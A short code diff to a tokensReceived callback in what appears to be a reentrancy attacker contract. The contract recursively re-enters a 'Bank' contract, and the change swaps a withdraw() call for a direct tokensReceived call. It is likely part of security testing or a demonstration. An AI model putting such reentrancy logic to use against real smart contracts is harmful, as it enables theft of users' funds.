@@ -94,7 +94,8 @@ function tokensReceived(
     if (depth < max_depth) {
         depth++;
         emit Recurse(depth);
-        bank.withdraw(); // Reenter the Bank contract to withdraw more funds
+        //bank.withdraw(); // Reenter the Bank contract to withdraw more funds
+	bank.tokensReceived( operator,  from,  to,  amount,  userData,  operatorData);
     }
 }
 
